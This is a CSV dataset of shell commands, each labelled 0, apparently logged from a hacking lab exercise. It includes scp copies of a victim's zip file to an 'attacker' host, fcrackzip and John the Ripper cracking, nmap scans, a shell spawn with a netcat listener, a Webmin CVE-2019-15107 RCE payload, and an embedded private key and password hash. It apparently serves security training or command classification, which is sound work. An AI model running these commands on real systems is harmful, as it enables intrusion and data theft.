value,target
exiz,0
file hacking/,0
sudo cd root,0
cd 'Croatia 2019'/,0
"find . -name ""*.zip""",0
scp .invoices2019.zip user@10.1.26.23:/root,0
scp .invoices2019.zip user@attacker:/root,0
ls .invoices2019.zip,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip /root,0
fcrackzip --dictionary wordlist.txt ../.invoices2019.zip,0
fcrackzip --dictionary ../.invoices2019.zip,0
fcrackzip ../.invoices2019.zip,0
unzip -h,0
unzip ../.invoices2019.zip,0
fcrackzip ../.invoices2019.zip --dictionary,0
fcrackzip ../.invoices2019.zip --dictionary wordlist.txt,0
fcrackzip -u ../.invoices2019.zip,0
fcrackzip -D wordlist.txt ../.invoices2019.zip,0
cp ../.invoices2019.zip .,0
head wordlist.txt,0
cat wordlist.txt | grep aaaaa,0
fcrackzip -v .invoices2019.zip,0
la -la,0
ls invoices2019/,0
fcrackzip -D ./wordlist.txt,0
fcrackzip .invoices2019.zip -D ./wordlist.txt,0
fcrackzip -v .invoices2019.zip -D ./wordlist.txt,0
cat wordlist.txt | wc -l,0
fcrackzip -D .invoices2019.zip < wordlist.txt,0
unzip,0
echo 123 | unzip .invoices2019.zip,0
fcrackzip -D wordlist.txt -- .invoices2019.zip,0
cat wordlist.txt | sort > words.txt,0
diff wordlist.txt words.txt,0
fcrackzip -D words.txt -- .invoices2019.zip,0
fcrackzip -D words.txt .invoices2019.zip,0
fcrackzip -D -p words.txt .invoices2019.zip,0
ls TAX157962,0
ls -l -a,0
scp .invoices2019.zip root@10.1.26.23:/~,0
scp .invoices2019.zip root@attacker:/~,0
scp admin@10.1.26.9:/~/personal/.invoices2019.zip /~,0
mv .invoices2019.zip hacking,0
sort wordlist.txt,0
touch wordlist_sorted.txt,0
sort wordlist.txt > wordlist_sorted.txt,0
cat wordlist_sorted.txt,0
fcrackzip -d -p wordlist_sorted.txt .invoices2019.zip,0
fcrackzip --dictionary -p wordlist_sorted.txt .invoices2019.zip,0
ping -b 10.1.26.0,0
nmap -Pn --open 10.1.26.0,0
nmap -Pn --open 10.1.26.0/24,0
ssh admin@10.1.26.9 && admin,0
"sshpass -p ""admin"" ssh admin@10.1.26.9",0
"echo ""admin"" > ssh admin@10.1.26.9",0
"echo ""admin"" | ssh admin@10.1.26.9",0
unzip -P aaaaaa .invoices2019.zip,0
fcrackzip -u .invoices2019.zip,0
fcrackzip -u -D .invoices2019.zip,0
fcrackzip -u -D aaaaaa .invoices2019.zip,0
fcrackzip -u -p aaaaaa .invoices2019.zip,0
fcrackzip -u -p aaaaa .invoices2019.zip,0
fcrackzip -u -p aaaa .invoices2019.zip,0
fcrackzip -u -D hacking/wordlist.txt .invoices2019.zip,0
fcrackzip -u -D -p hacking/wordlist.txt .invoices2019.zip,0
netmap 10.1.26.0/24,0
qqq,0
qq,0
mv .invoices2019.zip hacking/,0
echo Jake,0
scp .invoices2019.zip root@attacker:/hacking,0
ip -a,0
scp .invoices2019.zip attacker@10.1.26.23:/hacking,0
scp .invoices2019.zip root@10.1.26.23:/hacking,0
hostname -I,0
scp .invoices2019.zip attacker@192.168.131.211:/hacking,0
scp .invoices2019.zip root@192.168.131.211:/hacking,0
ssh admin@10.1.26.9:/home/admin/personal/.invoices2019.zip ~/hacking,0
su - root,0
admin@10.1.26.23,0
ssh - admin@10.1.26.9,0
unzip Mydata.xlsx,0
scp /home/admin/personal/.invoices2019.zip,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip /home,0
su -root,0
cd hack,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip /root/hacking/invoices.yip,0
fcrackzip invoices.yip,0
fcrackzip -D -p wordlist.txt invoices.yip,0
unzip invoices.yip,0
find zip,0
ls -a -R,0
scp admin@10.1.26.9:.invoices2019.zip /,0
scp admin@10.1.26.9:/home/personal/.invoices2019.zip /,0
scp admin@10.1.26.9:/personal/.invoices2019.zip /,0
frackzip .invoices2019.zip,0
fcrackzip .invoices2019.zip -u,0
fcrackzip -u -D /home/hacking/wordlist.txt .invoices2019.zip,0
fcrackzip -u -D /root/hacking/wordlist.txt .invoices2019.zip,0
man fcrack,0
fcrackzip -u -D -p /root/hacking/wordlist.txt .invoices2019.zip,0
ssh -F ~/.ssh/pool-id-ID-sandbox-id-ID-user-config link-11_home-switch,0
echo wordlist.txt,0
cd 'Italy 2018'/,0
scp .invoices2019.zip root@attacker:/root,0
scp admin@10.1.26.9:~/personal/.invoices.zip ~,0
fcrackzip -u -v -D -p ~/hacking/wordlist.txt .invoices2019.zip,0
scp admin@10.1.26.9:personal/.invoices2019.zip root@attacker/,0
scp root@attacker/ admin@10.1.26.9:personal/.invoices2019.zip,0
scp .invoices2019.zip root@attacker/,0
scp .invoices2019.zip root@10.1.26.0/24/,0
scp .invoices2019.zip root@10.1.26.0/,0
scp .invoices2019.zip /,0
scp .invoices2019.zip root@10.1.26.0:/,0
scp .invoices2019.zip root@10.1.26.0/24:/,0
scp .invoices2019.zip root@10.1.26.0:24/,0
scp -P 24  .invoices2019.zip root@10.1.26.0/,0
scp -P 24  .invoices2019.zip root@10.1.26.0/root/,0
scp -P 24  .invoices2019.zip root@10.1.26.0,0
scp admin@10.1.26.9:/.invoices2019.zip /,0
scp admin@server:personal/.invoices2019.zip /,0
scp admin@server:/home/personal/.invoices2019.zip /,0
scp admin@server:/home/admin/personal/.invoices2019.zip /,0
scp -P 24 .invoices2019.zip root@10.1.26.0:/,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip Download/,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip root/Downloads/,0
whoiam,0
sudo su root,0
cd../,0
quit,0
fcrakzip,0
scp admin@10.1.26.9:personal/.invoices2019.zip,0
scp admin@10.1.26.9:personal/.invoices2019.zip ~/,0
fcrackzip -u -c a -1 2-5 .invoices2019.zip,0
fcrackzip -b -c 'a1' -l 2-5 -v -u .invoices2019.zip,0
fcrackzip -b -c 'a1' -l 2-5 .invoices2019.zip,0
fcrackzip -b -l 2-5 .invoices2019.zip,0
fcrackzip -b -c a1 -l 1-8 -u .invoices2019.zip,0
fcrackzip -b -c a1 -l 1-8 -v -u .invoices2019.zip,0
fcrackzip -b -c a1 -l 5 -v -u .invoices2019.zip,0
fcrackzip -b -c a1 -l 1-5 -v -u .invoices2019.zip,0
cd -a,0
rm -rf invoices2019/,0
ls-al,0
fcrackzip -b -l 1-5 -v -u .invoices2019.zip,0
la,0
c d../,0
fcrackzip -D ./hacking/wordlist.txt .invoices2019.zip,0
fcrackzip -u -v -D -p ./hacking/wordlist.txt .invoices2019.zip,0
cd~,0
sudo nmap -t4 10.1.26.0,0
nmap 10.1.26.0 -t,0
nmap 10.1.26.0 -t4,0
ping 10.1.26.0/24,0
nmap 10.1.26.0/26,0
nmap -F 10.1.26.0/26,0
cd .invoices.zip,0
cat invoices.zip,0
man zip,0
scp admin@~/personal/.invoices2019.zip ~/hacking,0
"scp admin@server ""~/personal/.invoices2019.zip"" ~/hacking",0
scp /,0
% scp /,0
scp @: /personal/,0
job,0
admin@server:~$,0
root@attacker:/home# scp admin@10.1.26.9:~/personal/.invoices2019.zip,0
root@attacker:/home scp admin@10.1.26.9:~/personal/.invoices2019.zip,0
root@attacker:~/ scp admin@10.1.26.9:~/personal/.invoices2019.zip,0
root@attacker:~# scp admin@10.1.26.9:~/personal/.invoices2019.zip,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip /root/Desktop,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip ~/,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip ~/hacking#,0
root@attacker scp admin@10.1.26.9:~/personal/.invoices2019.zip ~/hacking,0
nmap--help,0
nmap-help,0
cd drwxr-xr-x,0
man fcrackzip -h,0
fcrackzip - -help,0
scp .ivnoices2019.zip,0
scp .invoices2019.zip /home,0
fcrakzip -b .invoices2019.zip,0
man fcrackzip -b .invoices2019.zip,0
echo Milan,0
scp admin@10.1.26.9:~/./personal/.invoices2019.zip ~/,0
sort hacking/wordlist.txt,0
sort hacking/wordlist.txt > wordlist.txt,0
fcrackzip -D .invoices2019.zip --use-unzip,0
fcrackzip -p wordlist.txt -D .invoices2019.zip,0
fcrackzip -p wordlist.txt -D .invoices2019.zip -u,0
cd sys,0
scp @:invoices2019.zip,0
sft,0
scp admin@server:.invoices2019.zip root@attacker:file.zip,0
scp admin@server:.invoices2019.zip file.zip,0
scp admin@server:invoices2019.zip file.zip,0
fcrackzip -D -u -p /root/hacking/wordlist.txt /home/admin/personal/.invoices2019.zip,0
cp .invoices2019.zip /root/file.zip,0
sudo cp .invoices2019.zip /root/file.zip,0
scp admin@server:.invoices2019.zip,0
scp admin@server:.invoices2019.zip /root/file.zip,0
scp admin@server:invoices2019.zip /root/file.zip,0
scp admin@server:.invoices2019.zip tar get,0
scp admin@server:.invoices2019.zip tar get /root,0
sudo cd hacking,0
su login,0
Nmap scan report for 10.1.26.9,0
nmap scan report for 10.1.26.9,0
ls-a,0
scp .invoices2019.zip root@10.1.26.23:/home/user-access,0
scp .invoices2019.zip user-access@10.1.26.23:/home/user-access,0
scp .invoices2019.zip root@attacker:/home/user-access,0
scp .invoices2019.zip user-access@10.1.26.254:/home/user-access,0
scp .invoices2019.zip debian@10.1.26.254:/home/user-access,0
scp admin@10.1.26.9:/personal/.invoices2019.zip /user-access,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip /user-access,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip /home/user-access,0
find -name wordlist,0
fcrakzip -h,0
cd ./var/lib/dictionaries-common/wordlist /home/user-access,0
"cd ""./var/lib/dictionaries-common/wordlist"" /home/user-access",0
"cd ""./var/lib/dictionaries-common/wordlist"" ""/home/user-access""",0
cp ./var/lib/dictionaries-common/wordlist /home/user-access,0
cd .var,0
cd var,0
cd lib,0
cd dictionaries-common/,0
cd wordlist/,0
cp ./var/lib/dictionaries-common/wordlist/wamerican /home/user-access,0
cp /var/lib/dictionaries-common/wordlist/wamerican /home/user-access,0
fcrackzip -D wamerican .invoices2019.zip,0
fcrackzip -D -u -p wamerican .invoices2019.zip,0
fcrackzip -D -p wamerican .invoices2019.zip,0
fcrackzip -D -p -v wamerican .invoices2019.zip,0
fcrackzip -v -D -p wamerican .invoices2019.zip,0
cd .invoices2019,0
unzip .invoices2019,0
fcrackzip -v -u -D -p wamerican .invoices2019.zip,0
fcrackzip -v -u -D wamerican .invoices2019.zip,0
cp /root/hacking/wordlist.txt /home/user-access,0
ipconfig -a,0
iconfig,0
systemctl,0
22 tcp open nfs,0
/22 tcp open nfs,0
22/tcp open nfs,0
2049/tcp open nfs,0
ls Crotia 2019,0
ls Croatia_2019,0
cdf,0
ls *.zip,0
find personal \*.zip,0
ssh attacker,0
/home# scp admin@10.1.26.9:~/personal/.invoices2019.zip.,0
/home#scp admin@10.1.26.9:~/personal/.invoices2019.zip,0
:/home# scp admin@10.1.26.9:~/personal/.invoices2019.zip,0
ssh attacker@10.1.26.23,0
ssh username@10.1.26.23,0
sudo frackzip,0
frackzip -h,0
fcrackzip - h,0
fcrackzip -D -u -p,0
scp admin@10.1.26.9 home,0
ls Dow,0
ls Public/,0
ls Videos/,0
cd personal/Italy\ 2018/,0
find . -iname 10.1.26.9,0
scp @: .invoices2019.zip,0
scp @: / invoices2019.zip,0
scp @: personal/,0
scp @: / personal/,0
scp @: / personal,0
scp @: .invoices2019.zip /,0
scp admin@10.1.26.9 .invoices2019.zip /,0
csp --help,0
scp admin@10.1.26.9:/personalinvoices2019.zip /,0
scp admin@10.1.26.9:/personal/invoices2019.zip /,0
scp / admin@10.1.26.9:~/personal/.invoices2019.zip,0
scp /:~/personal/.invoices2019.zip admin@10.1.26.9,0
scp ~/personal/.invoices2019.zip admin@10.1.26.9,0
man fraccrzip,0
scp ~/personal/.invoices2019.zip admin@10.1.26.9:~/,0
wxit,0
scp ~/personal/.invoices2019.zip admin@10.1.26.9:~/Desktop,0
You should really use find instead.,0
find <dir> -iname \*.zip,0
Example: to search for all .zip files in current directory and all sub-directories try this:,0
scp ~/personal/.invoices2019.zip ~/Desktop,0
scp ~/personal/.invoices2019.zip ~/,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip ~/Desktop,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip root@attacker:~/Desktop,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@attack,0
ssh admin@10.1.26.9/22,0
cdc personal,0
scp -r admin@server:./.invoices2019.zip /root/hacking,0
scp -r admin@server:.invoices2019.zip /root/hacking,0
scp -r admin@server:/.invoices2019.zip /root/hacking,0
scp -r admin@server:home/admin/personal/.invoices2019.zip /root/hacking,0
scp -r admin@server:/home/admin/personal/.invoices2019.zip /root/hacking,0
scp -r admin@server:/home/admin/personal/.invoices2019.zip /,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip /home/root/hacking,0
hacking,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@attacker:/home/roor/hacking,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@attacker:/home/root/hacking,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@10.1.26.23:/home/root/hacking,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@192.168.129.44:/home/root/hacking,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@attacker:/root/hacking,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip /root/hacking,0
man fckrackzip,0
fcrackzip --d,0
fcrackzip --d --help,0
fcrackzip --d ./.invoices2019.xip,0
fcrackzip --d ./.invoices2019.zip,0
fcrackzip --d /.invoices2019.zip,0
fcrackzip --d .invoices2019.zip,0
fcrackzip --d invoices2019.zip,0
fcrackzip --d /home/root/hacking/.invoices2019.zip,0
fcrackzip --d /home/root/hacking/wordlist.txt,0
fcrackzip --d wordlist.txt .invoices2019.zip,0
fcrackzip --d .invoices2019.zip wordlist.txt,0
fcrackzip --b .invoices2019.zip,0
fcrackzip -D -p  wordlist.txt .invoices2019.zip,0
ssh admin@password,0
ssh admin@123456,0
$HOME /home/admin,0
$HOME,0
HOME,0
/home# scp admin@...:~/personal/.invoices2019.zip,0
scp admin@...:~/personal/.invoices2019.zip,0
scp admin@10.1.26.9 ~/personal/.invoices2019.zip,0
scp admin@10.1.26.9: /personal/.invoices2019.zip,0
scp admin@10.1.26.9: ~/personal/.invoices2019.zip,0
scp admin@10.1.26.9: ~/personal/,0
scp admin@10.1.26.9: ~/personal/.invoices2019.zip ./,0
scp admin@10.1.26.9: ~/personal/.invoices2019.zip ~,0
fcrackzip -D ./hacking/wordlist.txt,0
fcrackzip .invoices2019.zip -D ./hacking/wordlist.txt,0
fcrackzip -D -u -p /hacking/wordlist.txt .invoices2019.zip,0
fcrackzip -D -u -p ./hacking/wordlist.txt .invoices2019.zip,0
ssh root@10.1.26.1,0
ssh root@10.1.26.3,0
ping 10.1.26.1,0
ping 10.1.26.2,0
ping 10.1.26.3,0
ssh root@10.1.26.2,0
less hacking/wordlist.txt,0
netstat,0
nmap -v -sn 100.100.100.2,0
nmap -v -sn 10.1.135.83,0
OUTPUT:,0
MISC:,0
nmap -sV 172.18.1.14,0
touch heslo.txt,0
vim heslo.txt,0
ssh-keygen -t rsa,0
"python -c 'import subprocess; p=subprocess.call([""/bin/sh"",""-i""]);'",0
nc -nvlp 225,0
ssh eve@10.1.17.4 --help,0
ssh -i eve.key eve@10.1.17.4,0
chown key.eve 0644,0
chmod key.eve 0644,0
chmod 0644 key.eve,0
chmod 0644 eve.key,0
sudo ssh -i eve.key eve@10.1.17.4,0
chmod 0700 eve.key,0
ssh2john eve.key > eve.hash,0
python ssh2john.py eve.key > eve.hash,0
cat eve.hash,0
john eve.hash -wordlist=rockyou.txt,0
john eve.hash -wordlist=/usr/share/wordlists/rockyou.txt,0
cd top-secret/,0
cat flag.txt,0
.nmap 172.18.1.5,0
wpscan 172.18.1.5,0
nmap -sV -p 10000 web,0
ping web,0
nmap -v -A  172.18.1.5,0
nmap -F  172.18.1.5,0
git clone htpps://github.com/vulnersCom/nmap-vulners/usr/share/nmap/scripts/vulners,0
git clone https://github.com/vulnersCom/nmap-vulners/usr/share/nmap/scripts/vulners,0
nmap =sV =Pn 172.18.1.5,0
nmap -sV -Pn 172.18.1.5,0
git clone https://github.com/scipag/vulscan scipag_vulscan,0
ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan,0
nmap -sV --script=vulscan/vulscan.nse 172.18.1.5,0
cd /usr/share/nmap/scripts/,0
git clone https://github.com/vulnersCom/nmap-vulners.git,0
nmap --script nmap-vulners -sV 172.18.1.5 -p10000,0
class MetasploitModule < Msf::Exploit::Remote,0
chmod,0
chmod +x 47293.sh,0
./47293.sh,0
vi 47293.sh,0
./47293.sh 47293.sh http://172.18.1.5:10000/,0
./47293.sh 47293.sh http://172.18.1.5:10000,0
sh 47293.sh 47293.sh http://172.18.1.5:10000,0
cat 47293.sh,0
vim CVE-2019-15107.sh,0
sh CVE-2019-15107.sh,0
sh CVE-2019-15107.sh #!/bin/sh,0
"FLAG=""f3a0c13c3765137bcde68572707ae5c0""",0
URI=$1;,0
"echo -n ""Testing for RCE (CVE-2019-15107) on $URI: "";",0
"curl -ks $URI'/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id|echo '$FLAG'&new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H ""Content-Type: application/x-www-form-urlencoded"" -H 'Referer: '$URI'/session_login.cgi'|grep $FLAG>/dev/null 2>&1",0
if [ $? -eq 0 ]; then echo '\033[0;31mVULNERABLE!\033[0m'; else echo '\033[0;32mOK! (target is not vulnerable)\033[0m'; fi,0
cat CVE-2019-15107.sh,0
cat CVE-2019-15107.sh http://172.18.1.5:10000,0
sh CVE-2019-15107.sh http://172.18.1.5:10000,0
msfcli,0
ssh 172.18.1.5:39680,0
ssh localhost:4444,0
ssh 127.0.0.1:4444,0
ssh 127.0.0.1 -p 4444,0
ssh kocm@172.18.1.5,0
john key,0
john .-----BEGIN RSA PRIVATE KEY-----,0
"Proc-Type: 4,ENCRYPTED",0
"DEK-Info: AES-128-CBC,48A98AC639005A4158AA7B9CEEF483C4",0
Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2rKTU3w4k,0
2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/JqYBSDl,0
yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+uoXaRRJ,0
Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725tDOtR6zB,0
9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2jLGg4Mp,0
N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sDfO/gw1R,0
BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH4DCFgZ+,0
/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73otlGZyR7,0
5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpathYz1sUhe,0
RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0DwwVwm2S,0
vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/SBFYVy0F,0
TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZItCtQK2,0
pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQoyqBY2o,0
TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQgTg62m7e,0
0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68wBG67v+a,0
d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx54vd8N3,0
qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwDL4zVF5X,0
rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgswjSO4V5q,0
anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73mu00IXl,0
FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02j218KSm,0
TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dDNC5kybN,0
aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6Og7AllVL,0
uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6Id5X7uCQ,0
pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfIEDCzH9G,0
Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhmFpapjdW,0
/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4GJZAfqX,0
WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoXp+zyqT6,0
bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1rvkbaSm,0
sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+QnhgE86HE,0
I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG5n6eMYk,0
W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0IGcdwUxN,0
KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5ExUUvfHve,0
0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv54IqGVS,0
y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUeTJfSmvq,0
9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+EVPNaf6,0
rJf/WLYf6/Lmfgv/ECF+VqdLPGkLT8dEgrajh9t2TaoU+/+mxtGXaJ7Iea9I+g9l,0
22unE+jCDSQMF9IygWb8HfzBsruZ7IQ+/h7g7XDpEZrJf6+mdmbzBXLwlnnD1XG3,0
FEJ08UNnUQsuqoD+vPxunBwkFv5b/5yt0XMu9tZdXk9AW9BdasCIE1bY+au0cnTX,0
rjmFQ+KmCqH5lReI0Ai3fJ8pnZ2D3/m7AV/1llNaijp9NmriqK0jiVBpnEM+uH3a,0
WtUQOqd4QS2S8MwjPoBZ0hpXOY0JX95EvWhp58uOy0/o8yYSbb+bZe7g0+MJuF9R,0
Rj6xI5CiBdDo83VdQHlyaUawTlv/wUpqSRc9xsK/y2dLjzQhAD+QkWbm98jrcAGX,0
Tlqk1XDm0e9sNcXus5d5pnTWeCH4bnwnQDo0Ot/KljNmnG11/FXuPFnAToOq52Az,0
SqV4xTHhlfTZQcjVD+Rc44JkIFTr2gzDvcLOOMwcBf232/ySokL9xuMlLVc04Jy2,0
pG3A2vBQ1t0A62BglfKCobl9JVRwFhIIh4dzevvvtCuWnXk7AhodGIVF2XnBezou,0
q5ydQjEjf0ByejEAZt7EM14Ey9sHQhX83OWMb7Brqfzsfapkuplvnj1+kmIrKUaA,0
ytH5k1zr7ZQ5k2FasEDPwdVjSQfOW8G3CJ8GgpFokCL+KiwfvR3mJBM5ubn0di2z,0
UG2CX9gT4nU7h9RAhtu2p/F5FEGLVbX5GxJhvKP11MQqSsWI3OY3gTvG6campkyD,0
r4aMTuuESZSksPLDMwgkYTvWp/qaNnVpqaSHe1p2hk2DvEhIH7eSkK9gAPBLkcJ7,0
sah7VmkiXIRvhXdcVA/QXlpG7NfOVGfm/zVDfpWPAGUrGegNb3X5Y6QTzDE4lhcK,0
john --wordlist=-----BEGIN RSA PRIVATE KEY-----,0
john --wordlist=/usr/share/wordlists/rockyou.txt key,0
/usr/share/john/ssh2john.py key,0
/usr/share/john/ssh2john.py key > key2,0
john key@,0
john key2,0
john --wordlist=/usr/share/wordlists/rockyou.txt key@,0
john --wordlist=/usr/share/wordlists/rockyou.txt key2,0
cp key ./.ssh/id_rsa,0
ssh eve@sh 10.1.17.4,0
ssh eve@10.1.17.4,0
openssl,0
openssl rsa -in id_rsa -out key,0
cat key,0
mv key id_rsa,0
httpd,0
17 2.18.1.5,0
nc -z -nv 172.18.1.5,0
nc -z -nv 172.18.1.5 20-80,0
sudo us 172.18.1.5,0
nmap -sU 172.18.1.5,0
sudo nmap -sT -p- 172.18.1.5,0
nmap --help | grep flag,0
sudo nmap -r 172.18.1.5,0
sudo nmap -S 172.18.1.5,0
sudo nmap -sV 172.18.1.5,0
sudo nmap -v -S 172.18.1.5,0
sudo nmap -v 172.18.1.5,0
cat ssh2john.py,0
vim vun.sh,0
chmod 600 vun.sh,0
chmod +x vun.sh,0
./vun.sh,0
./vun.sh 172.18.1.5,0
cat ssh2john.py | grep -e '\d\d\d\d\d',0
python3 ssh2john.py,0
ls .*,0
cat .ssh/authorized_keys,0
ls .config/pulse/,0
ls .config/systemd/,0
ls .config/systemd/user/,0
msfmsf,0
sdf,0
cat ~/.bash_history,0
vim out.txt,0
./ssh2john.py out.txt >hash,0
python3 ssh2john.py out.txt >hash,0
cat hash,0
nmap -p 60000-65536,0
nmap -p 60000-65535,0
nmap 172.18.1.5 -p 60000-65535,0
nmap 172.18.1.5 -p 40000-60000,0
nmap 172.18.1.5 -p 20000-40000,0
nmap 172.18.1.5 -p 1000-20000,0
man msf,0
nmap 172.18.1.5 -p 10000,0
nmap 172.18.1.5 -p 10000 -sV,0
nikto -Help,0
cd .msf4,0
cd modules,0
searchsploit webmnin,0
apt update,0
apt install metasploit-framework,0
ls /usr/share/metasploit-framework,0
ls /usr/share/metasploit-framework/modules,0
ls /usr/share/metasploit-framework/modules/exploits,0
ls /usr/share/metasploit-framework/modules/exploits/linux,0
ls /usr/share/metasploit-framework/modules/exploits/linux/http,0
nmap -sn 172.18.1.5/24,0
nmap 147.251.6.10,0
echo eve:$6$024QHRGPtY7RBi.t$5mfgbDY10e7Q3HiWd2YcHRY2KWj7BRWobrSCe5kCBSw3ZMwEfFvxO625d9aQyswMr9hEGF79I1KvwswSzsklp/:18451:0:99999:7::: > shadow,0
cat shadow,0
echo eve:x:1003:1003::/home/eve:/bin/bash > passwd,0
unshadow passwd shadow > mypasswd.txt,0
cat mypasswd.txt,0
john mypasswd.txt,0
john shadow,0
"echo ""eve:$6$024QHRGPtY7RBi.t$5mfgbDY10e7Q3HiWd2YcHRY2KWj7BRWobrSCe5kCBSw3ZMwEfFvxO625d9aQyswMr9hEGF79I1KvwswSzsklp/:18451:0:99999:7:::"" > shadow",0
nano shadow,0
"echo ""-----BEGIN RSA PRIVATE KEY-----""",0
nano id_rsa,0
file id_rsa,0
john --format=SSH id_rsa,0
ssh2john id_rsa > id_rsa.hash,0
/usr/sbin/ss2john,0
/usr/sbin/ssh2john,0
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash,0
cat id_rsa.hash,0
